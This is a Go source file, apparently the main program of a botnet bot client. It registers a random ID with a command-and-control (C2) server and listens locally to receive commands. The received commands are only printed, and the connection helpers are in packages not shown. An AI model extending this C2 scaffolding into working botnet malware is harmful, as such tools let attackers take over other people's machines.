package main

import (
	cli "bot/communication/client"
	srv "bot/communication/server"
	msg "bot/message"
	"fmt"
	"net"
	"sync"
)

const (
	Msgsize    = 4096
)

var (
	wg sync.WaitGroup
	B msg.Bot
)

// tryConnect tries to connect to the remote commanding C2 server
func tryConnect()() {
	var remoteServer net.Conn = cli.ConnectToCommandingC2()
	if remoteServer != nil {
		defer remoteServer.Close()
	} else {
		return;
	}
	cli.WriteData(remoteServer, &B)
}

func main() () {
	B.GenerateRandomUid()
	
	wg.Add(1)
	go func(){
		defer wg.Done()
		tryConnect()
	}()
	
	var listener net.Listener = srv.StartLocalServer()
	defer listener.Close()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		
		conn, err := listener.Accept()
		
		if err != nil { return } // edode : Commanding server cannot connect
		defer conn.Close()
		
		fmt.Println("Accepted connection from ", conn.RemoteAddr())
		commands, err := srv.ReadCommands(conn, &B)
		
		if err != nil { return } // edode : Commanding server has closed connection
		fmt.Println("Received commands: ", commands)
	}()
	
	wg.Wait();
}


// https://blog.jbowen.dev/2019/09/the-magic-of-go-comments/
